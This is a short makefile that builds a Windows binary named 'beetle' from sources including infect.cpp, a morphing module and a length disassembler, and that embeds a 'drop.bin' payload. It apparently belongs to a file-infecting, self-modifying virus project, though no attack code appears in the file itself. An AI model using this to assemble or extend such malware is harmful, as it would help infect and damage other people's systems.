SRC=main.cpp common.cpp crc32.cpp infect.cpp ldasm.cpp morf.cpp find.cpp
NAME=beetle
OUT=bin/$(NAME).bin
DEBUG=../debug
RELEASE=../release
LIBS=../libs/ntdll.lib kernel32.lib advapi32.lib

b_debug:
	..\utils\bin2hex.exe ..\utils\drop.bin drop.h drop
	@cl $(SRC) /Fo$(DEBUG)/$(NAME)/ /Fd$(DEBUG)/$(NAME)/vc100.pdb /c /GS- /Gz /TP /ZI /nologo /W0 /D _DEBUG
	@cl loader.cpp /Fo$(DEBUG)/$(NAME)/ /c /GL /Gy /GS- /Gz /TP /Od /W0 /nologo 
    @link $(DEBUG)/$(NAME)/*.obj /OUT:$(DEBUG)/$(OUT) /PDB:$(DEBUG)/$(NAME)/$(NAME).pdb /LTCG /NOLOGO /NODEFAULTLIB /DEBUG /SUBSYSTEM:CONSOLE /ENTRY:"entry" /DYNAMICBASE /FIXED:No $(LIBS)
b_release:
	..\utils\bin2hex.exe ..\utils\drop.bin drop.h drop
	@cl /Fo$(RELEASE)/$(NAME)/ /Fd$(RELEASE)/$(NAME)/vc100.pdb $(SRC) loader.cpp /c /GL /Gy /GS- /Gz /TP /Od /W0 /nologo
	@link $(RELEASE)/$(NAME)/*.obj /OUT:$(RELEASE)/$(OUT) /LTCG /NOLOGO /NODEFAULTLIB /SUBSYSTEM:WINDOWS /ENTRY:"entry" /DYNAMICBASE /FIXED:No $(LIBS)
